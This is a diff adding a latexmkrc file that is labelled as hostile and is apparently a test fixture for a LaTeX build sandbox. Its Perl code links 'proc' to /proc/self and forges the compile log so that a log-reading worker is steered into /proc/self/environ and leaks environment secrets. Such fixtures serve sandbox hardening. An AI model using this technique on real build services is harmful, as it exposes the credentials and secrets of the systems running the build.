@@ -1,0 +1,15 @@
+# Hostile latexmkrc: Perl runs inside the sandbox whatever the shell-escape
+# setting. It leaves a link to /proc/self where the worker reads after the run,
+# then rewrites the log so that an error points through it: a worker following
+# the link would search its own environment for the runaway text and report
+# the line it found, one bit of a secret per error.
+symlink('/proc/self', 'proc');
+END {
+  open(my $log, '>', '/out/links.log') or die "cannot rewrite the log: $!";
+  print $log "This is pdfTeX (corpus: rewritten log)\n";
+  print $log "(./links.tex\n(./proc/environ\n";
+  print $log "Runaway argument?\nNODE_ENV=production\n";
+  print $log "! File ended while scanning use of \\galley.\n<inserted text>\n\n";
+  print $log "))\n";
+  close($log);
+}
